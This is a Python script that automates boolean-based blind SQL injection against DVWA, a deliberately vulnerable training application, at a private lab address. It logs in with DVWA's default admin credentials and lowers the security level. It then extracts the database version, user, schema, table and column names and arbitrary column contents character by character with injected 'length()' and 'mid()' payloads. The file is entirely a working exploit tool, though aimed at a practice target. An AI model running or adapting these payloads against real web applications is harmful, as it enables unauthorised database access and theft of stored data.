#!/usr/bin/env python

import requests
import sys

s = requests.Session()

lista = 'abcdefghijklmnopqrstuvwxyz0123456789!"#$%&\'()*+,-./:;<=>?@[]^_~'

def dvwa_login():
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url=url, data=params)
    #print("\n- Logged In.")


def dvwa_security():
    url = 'http://192.168.210.130/dvwa/security.php'
    params = {'security':'low','seclev_submit':'Submit'}
    r = s.post(url=url, data=params)
    #print("- Security set to Low.")


def version():
    for i in range(1,30):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and length(@@version)={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\nVersion length is: " + i)
            break
    count = int(i)  
    
    print("Version: ",end='')
    version = ''
    for j in range(1,count+1):
        j = str(j)
        for c in lista:
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and mid(@@version,{j},1)='{c}'-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                version = version+c
                print(c,end='',flush=True)


def user():
    for i in range(1,30):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and length(user())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\nUser length is: " + i)
            break
    count = int(i)  
    
    print("User: ",end='')
    user = ''
    for j in range(1,count+1):
        j = str(j)
        for c in lista:
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and mid(user(),{j},1)='{c}'-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                user = user+c
                print(c,end='',flush=True)

def db_name():
    for i in range(1,10):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and length(database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\nDatabase length is: " + i)
            break
    count = int(i)  
    
    print("Database: ",end='')
    db_name = ''
    for j in range(1,count+1):
        j = str(j)
        for c in lista:
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and mid(database(),{j},1)='{c}'-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                db_name = db_name+c
                print(c,end='',flush=True)

def databases():
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and (select count(schema_name) from information_schema.schemata)={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nTotal Databases: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select schema_name from information_schema.schemata limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of database {tc}: " + str(i))

    dbs_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select schema_name from information_schema.schemata limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                #tblLen = i
                print(f"\nDatabase {tc}: ",end='')

                for n in range(1,i+1):
                    n = str(n)
                    for c in lista:
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1' and mid((select schema_name from information_schema.schemata limit {tc},1),{n},1)='{c}'-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            dbs_name = dbs_name + c
                            print(c,end='',flush=True)


def tables():
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and (select count(table_name) from information_schema.tables where table_schema=database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nTotal Tables: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select table_name from information_schema.tables where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of table {tc}: " + str(i))

    tbl_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select table_name from information_schema.tables where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                #tblLen = i
                print(f"\nTable {tc}: ",end='')

                for n in range(1,i+1):
                    n = str(n)
                    for c in lista:
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1' and mid((select table_name from information_schema.tables where table_schema=database() limit {tc},1),{n},1)='{c}'-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            tbl_name = tbl_name + c
                            print(c,end='',flush=True)
                

def columns():
    for i in range(1,100):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and (select count(column_name) from information_schema.columns where table_schema=database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nTotal Columns: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select column_name from information_schema.columns where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of column {tc}: " + str(i))

    col_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select column_name from information_schema.columns where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                #tblLen = i
                print(f"\nColumn {tc}: ",end='')

                for n in range(1,i+1):
                    n = str(n)
                    for c in lista:
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1' and mid((select column_name from information_schema.columns where table_schema=database() limit {tc},1),{n},1)='{c}'-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            col_name = col_name + c
                            print(c,end='',flush=True)


def tbls_cols():
    for i in range(1,100):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and (select count(column_name) from information_schema.columns where table_schema=database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nTotal Columns: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select column_name from information_schema.columns where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
               print(f"Length of column {tc}: " + str(i))

    col_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select column_name from information_schema.columns where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                #tblLen = i
                print(f"\nColumn {tc}: ",end='')

                for n in range(1,i+11):
                    n = str(n)
                    for c in lista:
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1' and mid((select concat(table_name,':',column_name) from information_schema.columns where table_schema=database() limit {tc},1),{n},1)='{c}'-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            col_name = col_name + c
                            print(c,end='',flush=True)



def t_c():
    tab = sys.argv[1]
    for i in range(1,100):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='{tab}')={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nTotal Columns: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select column_name from information_schema.columns where table_schema=database() and table_name='{tab}' limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of column {tc}: " + str(i))

    col_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select column_name from information_schema.columns where table_schema=database() and table_name='{tab}' limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                #tblLen = i
                print(f"\nColumn {tc}: ",end='')

                for n in range(1,i+1):
                    n = str(n)
                    for c in lista:
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1' and mid((select column_name from information_schema.columns where table_schema=database() and table_name='{tab}' limit {tc},1),{n},1)='{c}'-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            col_name = col_name + c
                            print(c,end='',flush=True)

def data_col():
    tab = sys.argv[1]
    col = sys.argv[2]
    for i in range(1,100):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and (select count({col}) from {tab})={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nTotal Columns: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,40):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select {col} from {tab} limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of column {tc}: " + str(i))

    col_name = ''
    for tc in range(count):
        for i in range(1,40):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select {col} from {tab} limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                #tblLen = i
                print(f"\nColumn {tc}: ",end='')

                for n in range(1,i+1):
                    n = str(n)
                    for c in lista:
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1' and mid((select {col} from {tab} limit {tc},1),{n},1)='{c}'-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            col_name = col_name + c
                            print(c,end='',flush=True)



def main():
    dvwa_login()
    dvwa_security()
    try:
        if sys.argv[1] == '--version':
            version()
        if sys.argv[1] == '--user':
            user()
        if sys.argv[1] == '--db-name':
            db_name()
        if sys.argv[1] == '--databases':
            databases()
        if sys.argv[1] == '--tables':
            tables()
        if sys.argv[1] == '--columns':
            columns()
        if sys.argv[1] == '--tbls-cols':
            tbls_cols()
        #t_c()
        data_col()
    except:
        print("""Usage: python3 dvwa-blind-low.py <argument>\n
        Arguments are as follows:
        version    --version
        user       --user
        database   --db-name
        databases  --databases
        tables     --tables
        columns    --columns
        tbls-cols  --tbls-cols
        """)

if __name__=="__main__":
    main()

